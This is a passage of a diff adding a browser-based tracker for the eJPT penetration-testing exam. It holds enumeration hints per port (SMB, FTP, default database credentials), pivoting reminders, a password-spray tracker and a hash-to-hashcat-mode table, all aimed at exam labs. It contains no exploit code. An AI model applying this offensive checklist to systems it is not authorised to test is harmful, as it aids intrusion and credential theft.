@@ -1,0 +1,1371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>eJPT Exam Tracker v4</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{--bg-deep:#080d19;--bg-card:#111827;--bg-input:#1a2332;--bg-header:#0c1322;--border:#1e293b;--accent:#10b981;--accent-dim:#10b98122;--accent-border:#10b98144;--text:#e2e8f0;--text-dim:#94a3b8;--text-muted:#64748b;--text-dark:#475569;--text-darkest:#334155;--warn:#f59e0b;--danger:#ef4444;--blue:#3b82f6;--purple:#a855f7;--cyan:#0ea5e9}
+  .theme-red{--bg-deep:#120808;--bg-card:#1a0f0f;--bg-input:#241515;--bg-header:#150a0a;--border:#2d1a1a;--accent:#f87171;--accent-dim:#f8717122;--accent-border:#f8717144;--text:#fde8e8;--text-dim:#d4a0a0;--text-muted:#9a6b6b;--text-dark:#7a5050;--text-darkest:#5a3838;--warn:#fbbf24;--danger:#ef4444;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee}
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: var(--bg-deep); color: var(--text); font-family: 'JetBrains Mono','Fira Code','Cascadia Code',monospace; font-size: 13px; min-height: 100vh; transition: background .3s, color .3s; }
+  #header { padding: 10px 16px 8px; border-bottom: 1px solid var(--accent-border); background: linear-gradient(180deg,var(--bg-header) 0%,var(--bg-deep) 100%); position: sticky; top: 0; z-index: 10; }
+  #header h1 { font-size: 15px; font-weight: 700; color: var(--accent); letter-spacing: 1px; }
+  #header .subtitle { font-size: 10px; color: var(--text-dark); margin-top: 1px; }
+  /* EXAM TIMER (Feature 1) */
+  .exam-timer{display:flex;align-items:center;gap:6px;background:var(--bg-input);border:1px solid var(--border);border-radius:5px;padding:4px 10px}
+  .timer-display{font-size:14px;font-weight:700;color:var(--warn);letter-spacing:1px;font-variant-numeric:tabular-nums}
+  .timer-display.crit{color:var(--danger);animation:tpulse 1s infinite}
+  @keyframes tpulse{0%,100%{opacity:1}50%{opacity:.5}}
+  .timer-label{font-size:9px;color:var(--text-dark);font-weight:600;letter-spacing:.5px}
+  .timer-btn{background:0 0;border:1px solid var(--border);color:var(--text-muted);font-family:inherit;font-size:10px;padding:2px 6px;border-radius:3px;cursor:pointer;font-weight:700}
+  .timer-btn:hover{border-color:var(--accent);color:var(--accent)}
+  /* PROGRESS BAR (Feature 10) */
+  .progress-wrap{display:flex;align-items:center;gap:8px;flex:1;max-width:320px;min-width:140px}
+  .progress-bar{flex:1;height:10px;background:var(--bg-input);border-radius:5px;overflow:hidden;border:1px solid var(--border);display:flex}
+  .seg-owned{background:var(--accent);transition:width .3s}
+  .seg-inprog{background:var(--warn);transition:width .3s}
+  .seg-enum{background:var(--text-darkest);transition:width .3s}
+  .progress-label{font-size:10px;color:var(--text-muted);font-weight:700;white-space:nowrap}
+  /* SEARCH (Feature 6) */
+  .search-wrap{position:relative}
+  .search-wrap input{background:var(--bg-input);border:1px solid var(--border);border-radius:4px;color:var(--text);padding:4px 8px 4px 22px;font-family:inherit;font-size:10px;width:150px;outline:0;transition:width .2s}
+  .search-wrap input:focus{border-color:var(--accent);width:210px}
+  .search-wrap::before{content:"⌕";position:absolute;left:7px;top:50%;transform:translateY(-50%);color:var(--text-dark);font-size:11px;pointer-events:none}
+  .card.search-hit{border-color:var(--warn)!important;box-shadow:0 0 6px #f59e0b33}
+  /* KILL CHAIN (Feature 2) */
+  .kc-wrap{margin-top:8px;padding-top:8px;border-top:1px solid var(--border)}
+  .kc-title{font-size:10px;color:var(--text-dark);font-weight:700;letter-spacing:.5px;margin-bottom:6px}
+  .kc-phases{display:flex;gap:2px;flex-wrap:wrap}
+  .kc-phase{display:flex;align-items:center;gap:4px;padding:3px 8px;border-radius:3px;font-size:10px;font-weight:600;cursor:pointer;border:1px solid var(--border);background:var(--bg-input);color:var(--text-muted);transition:all .15s;white-space:nowrap}
+  .kc-phase.kc-active{border-color:var(--warn);color:var(--warn);background:#f59e0b11}
+  .kc-phase.kc-done{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
+  .kc-phase.kc-pending::before{content:"○ "}.kc-phase.kc-active::before{content:"◉ "}.kc-phase.kc-done::before{content:"✓ "}
+  /* CMD TEMPLATES (Feature 3) */
+  .cmd-tpl{border:1px solid var(--border);border-radius:5px;padding:8px 12px;margin-bottom:6px;background:var(--bg-card);cursor:pointer;transition:border-color .15s}
+  .cmd-tpl:hover{border-color:var(--cyan)}
+  .cmd-tpl-label{font-size:10px;color:var(--cyan);font-weight:700;letter-spacing:.5px;margin-bottom:3px}
+  .cmd-tpl-code{font-size:11px;color:var(--text);line-height:1.6;white-space:pre-wrap;word-break:break-all}
+  .cmd-tpl-code .ph{color:var(--warn);font-weight:700}
+  /* UNDO BAR (Feature 8) */
+  .undo-bar{position:fixed;bottom:16px;left:50%;transform:translateX(-50%);background:var(--bg-card);border:1px solid var(--warn);border-radius:6px;padding:8px 16px;display:flex;align-items:center;gap:10px;z-index:50;box-shadow:0 4px 20px rgba(0,0,0,.5);animation:undo-in .2s}
+  @keyframes undo-in{from{opacity:0;transform:translateX(-50%) translateY(10px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}
+  /* SHORTCUTS (Feature 9) */
+  .shortcuts-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);display:flex;align-items:center;justify-content:center;z-index:200}
+  .shortcuts-box{background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:24px;min-width:380px;max-width:90vw}
+  .shortcuts-box h2{font-size:14px;color:var(--accent);margin-bottom:16px;letter-spacing:1px}
+  .sc-row{display:flex;justify-content:space-between;align-items:center;padding:5px 0;border-bottom:1px solid var(--border)}
+  .sc-key{background:var(--bg-input);border:1px solid var(--border);border-radius:3px;padding:2px 8px;font-size:11px;color:var(--accent);font-weight:700;min-width:60px;text-align:center}
+  .sc-desc{font-size:11px;color:var(--text-dim)}
+  .theme-toggle{background:0 0;border:1px solid var(--border);border-radius:4px;padding:3px 8px;cursor:pointer;font-family:inherit;font-size:10px;font-weight:700;color:var(--text-muted);transition:all .15s}
+  .theme-toggle:hover{border-color:var(--accent);color:var(--accent)}
+  .btn-purple{background:#a855f718;color:var(--purple);border-color:#a855f744}
+  .btn-blue{background:#3b82f618;color:var(--blue);border-color:#3b82f644}
+  .btn-warn{background:#f59e0b18;color:var(--warn);border-color:#f59e0b44}
+  .btn-cyan{background:#0ea5e918;color:var(--cyan);border-color:#0ea5e944}
+  .tab-cmds{color:var(--cyan)!important}.tab-cmds.active{background:#0ea5e922!important;border-color:#0ea5e944!important}
+  .tab-bar { display: flex; gap: 4px; flex-wrap: wrap; margin-top: 12px; }
+  .tab-btn { padding: 5px 10px; background: transparent; border: 1px solid transparent; border-radius: 4px; color: #64748b; cursor: pointer; font-family: inherit; font-size: 11px; font-weight: 700; letter-spacing: 0.5px; transition: all 0.15s; }
+  .tab-btn:hover { color: #94a3b8; border-color: #1e293b; }
+  .tab-btn.active { background: #10b98122; border-color: #10b98144; color: #10b981; }
+  .tab-import { color: #3b82f6 !important; }
+  .tab-import.active { background: #3b82f622 !important; border-color: #3b82f644 !important; }
+  .tab-spray { color: #a855f7 !important; }
+  .tab-spray.active { background: #a855f722 !important; border-color: #a855f744 !important; }
+  .tab-btn .count { margin-left: 4px; background: #334155; color: #94a3b8; border-radius: 3px; padding: 1px 5px; font-size: 10px; }
+  .tab-btn.active .count { background: #10b981; color: #080d19; }
+  #content { padding: 12px 16px; }
+  .card { border: 1px solid #1e293b; border-radius: 5px; padding: 10px; margin-bottom: 8px; background: #111827; transition: border-color 0.2s; }
+  .card.locked { border-color: #10b98166; box-shadow: 0 0 0 1px #10b98122; }
+  .card-row { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; margin-bottom: 6px; }
+  .card-row:last-child { margin-bottom: 0; }
+  .fi { background: #1a2332; border: 1px solid #1e293b; border-radius: 4px; color: #e2e8f0; padding: 8px 10px; font-family: inherit; font-size: 12px; outline: none; }
+  .fi:focus { border-color: #10b981; }
+  textarea.fi { width: 100%; min-height: 300px; resize: vertical; line-height: 1.6; padding: 12px; }
+  .btn { background: #10b98118; color: #10b981; border: 1px solid #10b98144; border-radius: 4px; padding: 4px 10px; cursor: pointer; font-family: inherit; font-size: 11px; font-weight: 600; white-space: nowrap; transition: filter 0.1s; }
+  .btn-danger { background: #ef444418; color: #ef4444; border-color: #ef444444; }
+  .btn:hover { filter: brightness(1.25); }
+  .port-hint { font-size: 10px; color: #f59e0b; font-style: italic; }
+  .pivot-reminder { font-size: 10px; color: #f59e0b; font-style: italic; margin-top: 4px; }
+  .port-label { font-size: 11px; color: #64748b; font-weight: 600; letter-spacing: 0.5px; margin: 6px 0 4px; }
+  .arrow { color: #10b981; font-weight: 700; }
+  .timestamp { font-size: 10px; color: #475569; }
+  .warn-box { margin-top: 12px; padding: 8px; background: #1a233244; border-radius: 4px; font-size: 11px; color: #f59e0b; }
+  .section-label { font-size: 11px; color: #94a3b8; font-weight: 600; letter-spacing: 0.5px; margin-bottom: 12px; }
+  .check-card { border: 1px solid #1e293b; border-radius: 5px; padding: 10px 14px; margin-bottom: 6px; background: #111827; }
+  .check-trigger { font-size: 10px; color: #10b981; font-weight: 700; letter-spacing: 0.5px; margin-bottom: 4px; }
+  .check-question { color: #f59e0b; font-size: 12px; }
+  .section { margin-bottom: 12px; border: 1px solid #1e293b; border-radius: 6px; overflow: hidden; background: #0c1322; }
+  .section-header { width: 100%; display: flex; align-items: center; gap: 10px; padding: 10px 14px; background: #111827; border: none; cursor: pointer; color: #e2e8f0; font-family: inherit; font-size: 13px; font-weight: 700; letter-spacing: 0.5px; }
+  .section-arrow { color: #10b981; font-size: 10px; }
+  .section-body { padding: 12px 14px; display: none; }
+  .section.open .section-body { display: block; }
+  .cl { line-height: 2; font-size: 12px; }
+  .cn { color: #10b981; }
+  code { background: #1a2332; padding: 1px 4px; border-radius: 3px; font-size: 11px; }
+  /* SERVICE VECTOR TAGS */
+  .svc-tag { display: inline-block; font-size: 9px; font-weight: 700; padding: 1px 5px; border-radius: 3px; letter-spacing: 0.5px; white-space: nowrap; vertical-align: middle; }
+  /* PER-TARGET CHECKLIST */
+  .tgt-checklist { margin-top: 8px; padding-top: 8px; border-top: 1px solid #1e293b; }
+  .tgt-checklist-title { font-size: 10px; color: #475569; font-weight: 700; letter-spacing: 0.5px; margin-bottom: 6px; }
+  .tgt-checks { display: flex; flex-wrap: wrap; gap: 6px 12px; }
+  .tgt-check-item { display: flex; align-items: center; gap: 4px; cursor: pointer; }
+  .tgt-check-item input[type=checkbox] { accent-color: #10b981; width: 12px; height: 12px; cursor: pointer; }
+  .tgt-check-item label { font-size: 10px; color: #64748b; cursor: pointer; white-space: nowrap; transition: color 0.15s; }
+  .tgt-check-item input:checked + label { color: #10b981; text-decoration: line-through; }
+  /* TIMER */
+  .tgt-timer { font-size: 10px; color: #f59e0b; font-weight: 700; letter-spacing: 0.5px; margin-left: auto; padding: 2px 6px; background: #f59e0b11; border-radius: 3px; }
+  .tgt-timer.stale { color: #ef4444; background: #ef444411; }
+  /* HASH BADGE */
+  .hash-badge { font-size: 9px; font-weight: 700; padding: 1px 5px; border-radius: 3px; white-space: nowrap; }
+  /* FLAG LOCK */
+  .flag-lock-badge { font-size: 9px; color: #10b981; background: #10b98122; border: 1px solid #10b98144; border-radius: 3px; padding: 1px 6px; font-weight: 700; letter-spacing: 0.5px; }
+  /* SPRAY MATRIX */
+  .spray-table { width: 100%; border-collapse: collapse; font-size: 11px; }
+  .spray-table th { background: #0c1322; color: #64748b; font-size: 10px; font-weight: 700; letter-spacing: 0.5px; padding: 6px 8px; border: 1px solid #1e293b; text-align: left; }
+  .spray-table td { padding: 5px 8px; border: 1px solid #1e293b; vertical-align: middle; background: #111827; }
+  .spray-table tr:hover td { background: #141e2e; }
+  .spray-cell { display: flex; gap: 4px; justify-content: center; }
+  .spray-btn { font-size: 10px; padding: 2px 7px; border-radius: 3px; border: 1px solid; cursor: pointer; font-family: inherit; font-weight: 700; background: transparent; transition: all 0.1s; }
+  .spray-btn:hover { filter: brightness(1.4); }
+  .s-untried { color: #475569; border-color: #334155; }
+  .s-works { color: #10b981; border-color: #10b981; background: #10b98122; }
+  .s-fail { color: #ef4444; border-color: #ef4444; background: #ef444422; }
+  /* PIVOT PULSE */
+  .pivot-pulse { display: flex; align-items: center; gap: 10px; padding: 10px 14px; background: #f59e0b0d; border: 1px solid #f59e0b44; border-radius: 5px; margin-bottom: 12px; font-size: 11px; color: #f59e0b; animation: pulse-border 2s infinite; }
+  @keyframes pulse-border { 0%,100%{border-color:#f59e0b44} 50%{border-color:#f59e0baa} }
+  .pivot-pulse-dot { width: 8px; height: 8px; border-radius: 50%; background: #f59e0b; animation: pulse-dot 1.5s infinite; flex-shrink: 0; }
+  @keyframes pulse-dot { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(0.7)} }
+  /* MAP */
+  #mapCanvas { border: 1px solid #1e293b; border-radius: 6px; cursor: grab; display:block; background: #0a0f1e; }
+  #mapCanvas:active { cursor: grabbing; }
+  .map-toolbar { display:flex; gap:6px; flex-wrap:wrap; align-items:center; margin-bottom:10px; }
+  .map-toolbar .btn { padding: 5px 12px; }
+  .map-help { font-size:10px; color:#475569; margin-top:8px; line-height:1.8; }
+  .map-legend { display:flex; gap:12px; flex-wrap:wrap; margin-top:8px; align-items:center; }
+  .map-legend-item { display:flex; align-items:center; gap:5px; font-size:10px; color:#94a3b8; }
+  .map-legend-dot { width:10px; height:10px; border-radius:50%; }
+  .map-modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center; z-index:100; }
+  .map-modal-box { background:#111827; border:1px solid #1e293b; border-radius:8px; padding:20px; min-width:320px; max-width:90vw; }
+  .map-modal-title { font-size:13px; font-weight:700; color:#10b981; margin-bottom:14px; letter-spacing:0.5px; }
+  .map-modal-row { margin-bottom:10px; }
+  .map-modal-row label { display:block; font-size:10px; color:#64748b; margin-bottom:4px; font-weight:600; letter-spacing:0.5px; }
+  .map-modal-row .fi { width:100%; }
+  .map-modal-actions { display:flex; gap:8px; justify-content:flex-end; margin-top:16px; }
+  .save-bar { display:flex; gap:6px; align-items:center; }
+  .save-flash { font-size:10px; color:#10b981; opacity:0; transition:opacity 0.3s; letter-spacing:0.5px; font-weight:600; }
+  .save-flash.show { opacity:1; }
+  .hdr-row { display:flex; align-items:center; justify-content:space-between; margin-bottom:4px; }
+  .imp-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px; margin-bottom:12px; }
+  @media(max-width:900px){ .imp-grid { grid-template-columns:1fr; } }
+</style>
+</head>
+<body>
+<div id="header">
+  <div style="display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;margin-bottom:4px;">
+    <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
+      <div><h1>eJPT EXAM TRACKER <span style="font-size:10px;color:var(--text-dark);font-weight:400">v4</span></h1><div class="subtitle" id="stats"></div></div>
+      <div id="progressBar" class="progress-wrap"></div>
+    </div>
+    <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
+      <div id="examTimer" class="exam-timer"></div>
+      <div class="search-wrap"><input type="text" id="globalSearch" placeholder="Search… (/)" /></div>
+      <button class="theme-toggle" id="themeBtn" onclick="toggleTheme()" title="Toggle red/dark">☀</button>
+      <span class="save-flash" id="saveFlash">✓ SAVED</span>
+      <button class="btn" onclick="manualSave()" title="Ctrl+S">SAVE</button>
+      <button class="btn" onclick="exportJSON()">JSON</button>
+      <button class="btn btn-purple" onclick="exportMarkdown()">MD RPT</button>
+      <button class="btn" onclick="importJSON()">IMPORT</button>
+      <button class="btn btn-danger" onclick="resetAllData()" title="Clear all data for new exam">RESET</button>
+      <button class="theme-toggle" onclick="showShortcuts()" title="Shortcuts (?)">⌨</button>
+    </div>
+  </div>
+  <div class="tab-bar" id="tabBar"></div>
+</div>
+<div id="content"></div>
+<div id="undoBar"></div>
+<div id="shortcutsOverlay"></div>
+<script>
+/* ================================================================ DATA TABLES ================================================================ */
+const PH={21:"FTP → banner + anonymous login",22:"SSH → only with creds",80:"HTTP → browse → source → robots → sitemap → headers → dirb",139:"SMB → enum4linux -a",443:"HTTPS → same as 80 + check cert",445:"SMB → enum4linux -a → smbclient -L -N",3306:"MySQL → root blank/default creds",3389:"RDP → only with creds",8080:"HTTP-Alt → treat like port 80",8443:"HTTPS-Alt → treat like 443",1433:"MSSQL → sa blank/default creds",5432:"PostgreSQL → postgres blank creds",6379:"Redis → no auth default",2049:"NFS → showmount -e",111:"RPC → rpcinfo -p"};
+const SVC_TAGS={21:{l:"FTP",bg:"#0ea5e922",c:"#0ea5e9"},22:{l:"SSH-CREDS",bg:"#f59e0b22",c:"#f59e0b"},23:{l:"TELNET",bg:"#ef444422",c:"#ef4444"},80:{l:"WEB-ENUM",bg:"#3b82f622",c:"#3b82f6"},111:{l:"RPC",bg:"#64748b22",c:"#94a3b8"},135:{l:"RPC/DCOM",bg:"#f9731622",c:"#f97316"},139:{l:"SMB",bg:"#f9731622",c:"#f97316"},443:{l:"WEB-ENUM",bg:"#3b82f622",c:"#3b82f6"},445:{l:"SMB",bg:"#f9731622",c:"#f97316"},1433:{l:"MSSQL",bg:"#ef444422",c:"#ef4444"},2049:{l:"NFS",bg:"#10b98122",c:"#10b981"},3306:{l:"MYSQL",bg:"#ef444422",c:"#ef4444"},3389:{l:"RDP-CREDS",bg:"#f59e0b22",c:"#f59e0b"},5432:{l:"PGSQL",bg:"#0ea5e922",c:"#0ea5e9"},5985:{l:"WINRM",bg:"#f59e0b22",c:"#f59e0b"},6379:{l:"REDIS",bg:"#ef444422",c:"#ef4444"},8080:{l:"WEB-ENUM",bg:"#3b82f622",c:"#3b82f6"},8443:{l:"WEB-ENUM",bg:"#3b82f622",c:"#3b82f6"},27017:{l:"MONGO",bg:"#10b98122",c:"#10b981"}};
+const PVH={autoroute:"→ MSF modules only. External tools need portfwd.",portfwd:"→ External tools point at 127.0.0.1:<local_port>, NEVER the internal IP.",socks_proxy:"→ Tools point at ACTUAL target IP. Nmap needs -sT -Pn."};
+const DC=[{t:"PIVOT ACTION",q:"Metasploit module or external tool?"},{t:"POST-EXPLOIT",q:"What OS am I on?"},{t:"SQLMAP",q:"Right parameter + right database?"},{t:"ENUMERATION",q:"Exhausted free & quiet options?"},{t:"SCAN FAILS",q:"Session → Config → Firewall. Fix plumbing first."},{t:"ESCALATION STALLS",q:"Move laterally. Check other home dirs. Password reuse."}];
+const TARGET_CHECKS=[{k:"browse",l:"Browsed",ports:[80,443,8080,8443]},{k:"source",l:"Src viewed",ports:[80,443,8080,8443]},{k:"robots",l:"robots.txt",ports:[80,443,8080,8443]},{k:"sitemap",l:"sitemap.xml",ports:[80,443,8080,8443]},{k:"curlI",l:"curl -I",ports:[80,443,8080,8443]},{k:"dirb",l:"dirb/gobust",ports:[80,443,8080,8443]},{k:"enum4",l:"enum4linux",ports:[139,445]},{k:"smbcl",l:"smbclient",ports:[139,445]},{k:"ftp",l:"FTP anon",ports:[21]},{k:"mysql",l:"MySQL root",ports:[3306,1433,5432]},{k:"nfs",l:"showmount",ports:[2049,111]},{k:"defcreds",l:"Default creds",ports:[]},{k:"postex",l:"Post-ex done",ports:[]}];
+const TABS=[{k:"map",l:"MAP"},{k:"import",l:"⬇ IMPORT",cls:"tab-import"},{k:"targets",l:"TARGETS"},{k:"spray",l:"🔫 SPRAY",cls:"tab-spray"},{k:"creds",l:"CREDS"},{k:"flags",l:"FLAGS"},{k:"pivots",l:"PIVOTS"},{k:"log",l:"CMD LOG"},{k:"cmds",l:"⚡ CMDS",cls:"tab-cmds"},{k:"notes",l:"NOTES"},{k:"checks",l:"CHECKS"}];
+const KC_PHASES=["Recon","Initial Access","Foothold","Priv Esc","Loot"];
+
+/* ================================================================ STATE ================================================================ */
+let S={targets:[],credentials:[],flags:[],pivots:[],commands:[],notes:"",mapNodes:[],mapEdges:[],sprayMatrix:{},examTimer:{start:null,paused:false,elapsed:0},theme:"dark"};
+let AT="map";
+let undoStack=[];
+let searchTerm="";
+
+/* ================================================================ UTILS ================================================================ */
+function uid(){return Date.now().toString(36)+Math.random().toString(36).slice(2,6)}
+function esc(s){return String(s).replace(/&/g,"&amp;").replace(/"/g,"&quot;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}
+let _storageAlerted=false;
+function save(){try{localStorage.setItem("ejpt-tracker-v4",JSON.stringify(S))}catch(e){if(e.name==='QuotaExceededError'){flashMsg("⚠ STORAGE FULL","var(--danger)");if(!_storageAlerted){_storageAlerted=true;alert("CRITICAL: Storage limit reached!\n\nExport to JSON immediately (click JSON button), then clear old notes or command log entries to free space.");setTimeout(()=>{_storageAlerted=false;},60000);}}}}
+function load(){
+  try{
+    const d=localStorage.getItem("ejpt-tracker-v4")||localStorage.getItem("ejpt-tracker");
+    if(d){S=JSON.parse(d);if(!S.mapNodes)S.mapNodes=[];if(!S.mapEdges)S.mapEdges=[];if(!S.sprayMatrix)S.sprayMatrix={};
+      if(!S.examTimer)S.examTimer={start:null,paused:false,elapsed:0};if(!S.theme)S.theme="dark";
+      S.targets.forEach(t=>{if(!t.checks)t.checks={};if(t.timerStart===undefined)t.timerStart=null;if(!t.killChain)t.killChain={};if(!t.kcNotes)t.kcNotes="";});}
+  }catch(e){}
+}
+function flashMsg(msg,color){const el=document.getElementById("saveFlash");el.textContent=msg||"✓ SAVED";if(color)el.style.color=color;else el.style.color="";el.classList.add("show");setTimeout(()=>{el.classList.remove("show");el.textContent="✓ SAVED";el.style.color="";},1500);}
+function flashSave(){flashMsg("✓ SAVED");}
+function manualSave(){save();flashSave();}
+function exportJSON(){
+  save();const blob=new Blob([JSON.stringify(S,null,2)],{type:"application/json"});
+  const a=document.createElement("a");a.href=URL.createObjectURL(blob);
+  a.download="ejpt-tracker-"+new Date().toISOString().slice(0,16).replace(/:/g,"")+".json";a.click();flashSave();
+}
+function importJSON(){
+  const inp=document.createElement("input");inp.type="file";inp.accept=".json";
+  inp.onchange=e=>{const f=e.target.files[0];if(!f)return;const r=new FileReader();
+    r.onload=ev=>{try{S=JSON.parse(ev.target.result);if(!S.mapNodes)S.mapNodes=[];if(!S.mapEdges)S.mapEdges=[];if(!S.sprayMatrix)S.sprayMatrix={};
+      if(!S.examTimer)S.examTimer={start:null,paused:false,elapsed:0};if(!S.theme)S.theme="dark";
+      S.targets.forEach(t=>{if(!t.checks)t.checks={};if(t.timerStart===undefined)t.timerStart=null;if(!t.killChain)t.killChain={};if(!t.kcNotes)t.kcNotes="";});
+      applyTheme();save();tabs();render();stats();flashSave();}catch(err){alert("Invalid file.")}};r.readAsText(f);};inp.click();
+}
+document.addEventListener("keydown",e=>{
+  if((e.ctrlKey||e.metaKey)&&e.key==="s"){e.preventDefault();manualSave();return;}
+  if((e.ctrlKey||e.metaKey)&&e.key==="f"){e.preventDefault();document.getElementById("globalSearch").focus();return;}
+  if((e.ctrlKey||e.metaKey)&&e.key==="z"){e.preventDefault();doUndo();return;}
+  if(e.key==="Escape"){closeShortcuts();closeModal();return;}
+  if(!e.ctrlKey&&!e.metaKey&&!e.altKey&&!e.target.matches("input,textarea,select")){
+    if(e.key==="?"){showShortcuts();return;}
+    const tabMap={"1":"map","2":"import","3":"targets","4":"spray","5":"creds","6":"flags","7":"pivots","8":"log","9":"cmds","0":"notes"};
+    if(tabMap[e.key]){e.preventDefault();sw(tabMap[e.key]);return;}
+    if(e.key==="n"||e.key==="N"){e.preventDefault();quickAdd();return;}
+  }
+});
+
+function stats(){
+  const o=S.targets.filter(t=>t.status==="Owned").length;
+  const ip=S.targets.filter(t=>t.status==="In Progress").length;
+  document.getElementById("stats").textContent=`${S.targets.length} targets · ${o} owned · ${ip} active · ${S.credentials.length} creds · ${S.flags.length} flags`;
+  renderProgressBar();renderExamTimer();
+}
+function tabs(){
+  const cs={map:S.mapNodes.length,import:0,targets:S.targets.length,spray:0,creds:S.credentials.length,flags:S.flags.length,pivots:S.pivots.length,log:S.commands.length,cmds:0,notes:0,checks:0};
+  document.getElementById("tabBar").innerHTML=TABS.map(t=>{
+    const c=cs[t.k];const ch=(c&&c>0)?`<span class="count">${c}</span>`:"";
+    return `<button class="tab-btn ${t.cls||""} ${AT===t.k?"active":""}" onclick="sw('${t.k}')">${t.l}${ch}</button>`;
+  }).join("");
+}
+function sw(k){AT=k;tabs();render();}
+function render(){
+  const el=document.getElementById("content");
+  const fn={map:rMap,import:rImport,targets:rTargets,spray:rSpray,creds:rCreds,flags:rFlags,pivots:rPivots,log:rLog,cmds:rCmds,notes:rNotes,checks:rChecks};
+  el.innerHTML=fn[AT]();bind();save();stats();if(AT==="map")initMap();
+}
+let _binds=[];
+function reg(id,evt,fn){_binds.push({id,evt,fn})}
+function bind(){_binds.forEach(b=>{const el=document.getElementById(b.id);if(el)el.addEventListener(b.evt,b.fn)});_binds=[];}
+// Debounce: fires fn after wait ms of inactivity
+let _debounceTimers={};
+function debounce(key,fn,wait){clearTimeout(_debounceTimers[key]);_debounceTimers[key]=setTimeout(fn,wait);}
+function fi(val,ph,w,cb){
+  const id="i"+uid();reg(id,"input",e=>{cb(e.target.value);debounce("fi_save",()=>{save();stats();tabs();},300);});
+  return `<input id="${id}" class="fi" type="text" placeholder="${ph}" value="${esc(val)}" style="width:${w}">`;
+}
+// fiChange: for fields that trigger render() (ports, hashes) — fires on blur/Enter to prevent focus loss
+function fiChange(val,ph,w,cb){
+  const id="ic"+uid();
+  reg(id,"change",e=>{cb(e.target.value);save();stats();tabs();render();});
+  reg(id,"keydown",e=>{if(e.key==="Tab"){cb(e.target.value);save();stats();tabs();render();}});
+  return `<input id="${id}" class="fi" type="text" placeholder="${ph}" value="${esc(val)}" style="width:${w}">`;
+}
+function sl(val,opts,cb,cfn){
+  const id="s"+uid();reg(id,"change",e=>{cb(e.target.value);save();stats();tabs();render();});
+  const c=cfn?cfn(val):"#e2e8f0";
+  return `<select id="${id}" class="fi" style="color:${c};font-weight:600;font-size:11px">${opts.map(o=>`<option value="${o.v}"${val===o.v?" selected":""}>${o.l}</option>`).join("")}</select>`;
+}
+function rb(cb,undoType,undoIdx,undoLabel){const id="r"+uid();reg(id,"click",()=>{if(undoType){const item=JSON.parse(JSON.stringify(undoType==="target"?S.targets[undoIdx]:undoType==="credential"?S.credentials[undoIdx]:undoType==="flag"?S.flags[undoIdx]:undoType==="pivot"?S.pivots[undoIdx]:undoType==="command"?S.commands[undoIdx]:null));if(item)pushUndo(undoType,{index:undoIdx,item},undoLabel||undoType);}cb();save();stats();tabs();render();});return `<button id="${id}" class="btn btn-danger">✕</button>`;}
+function ab(label,cb,cls=""){const id="a"+uid();reg(id,"click",()=>{cb();save();stats();tabs();render();});return `<button id="${id}" class="btn ${cls}">${label}</button>`;}
+
+/* ================================================================ HELPERS ================================================================ */
+function elapsedStr(ts){if(!ts)return "";const s=Math.floor((Date.now()-ts)/1000),m=Math.floor(s/60),hr=Math.floor(m/60);if(hr>0)return `${hr}h ${m%60}m`;return `${m}m ${s%60}s`;}
+
+// Hash identification — add new types here as a single data entry.
+// Prefix-matched entries are checked in order (most specific first).
+// Regex-matched entries run after all prefix checks fail.
+const HASH_PREFIXES=[
+  // yescrypt family — current Linux default (glibc 2.34+, Debian 11+, Ubuntu 22.04+)
+  {p:"$y$",   l:"yescrypt (-m 15300)",      c:"#10b981",m:15300},
+  {p:"$gy$",  l:"gost-yescrypt (-m 15600)", c:"#10b981",m:15600},
+  // classic Linux shadow
+  {p:"$6$",   l:"sha512crypt (-m 1800)",    c:"#ef4444",m:1800},
+  {p:"$5$",   l:"sha256crypt (-m 7400)",    c:"#f97316",m:7400},
+  {p:"$1$",   l:"md5crypt (-m 500)",        c:"#f59e0b",m:500},
+  // bcrypt variants
+  {p:"$2y$",  l:"bcrypt (-m 3200)",         c:"#ef4444",m:3200},
+  {p:"$2a$",  l:"bcrypt (-m 3200)",         c:"#ef4444",m:3200},
+  {p:"$2b$",  l:"bcrypt (-m 3200)",         c:"#ef4444",m:3200},
+  // CMS / app hashes
+  {p:"$P$",   l:"phpass (-m 400)",          c:"#a855f7",m:400},
+  {p:"$H$",   l:"phpass (-m 400)",          c:"#a855f7",m:400},
+  {p:"$S$",   l:"Drupal7 (-m 7900)",        c:"#8b5cf6",m:7900},
+  // argon2 family (hashcat 2i/2d/2id)
+  {p:"$argon2id$",l:"argon2id (-m 25600)",  c:"#10b981",m:25600},
+  {p:"$argon2i$", l:"argon2i (-m 25500)",   c:"#10b981",m:25500},
+  {p:"$argon2d$", l:"argon2d (-m 25400)",   c:"#10b981",m:25400},
+];
+// Regex-matched (no prefix, matched by pattern/length)
+const HASH_PATTERNS=[
+  {rx:/^\*[0-9A-Fa-f]{40}$/,               l:"MySQL-SHA1 (-m 300)",  c:"#0ea5e9",m:300},
+  {rx:/^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$/, l:"NTLM (-m 1000)",      c:"#10b981",m:1000},
+  {rx:/^[^\s:]+:[^\s:]+:[^\s:]+:[^\s:]+:[^\s:]+:[^\s:]+:[^\s:]+/,    // ≥7 colon fields
+                                             l:"NTLMv2 (-m 5600)",    c:"#10b981",m:5600},
+  {rx:/^[0-9a-fA-F]{32}$/,                 l:"MD5 (-m 0)",           c:"#f59e0b",m:0},
+  {rx:/^[0-9a-fA-F]{40}$/,                 l:"SHA1 (-m 100)",        c:"#f97316",m:100},
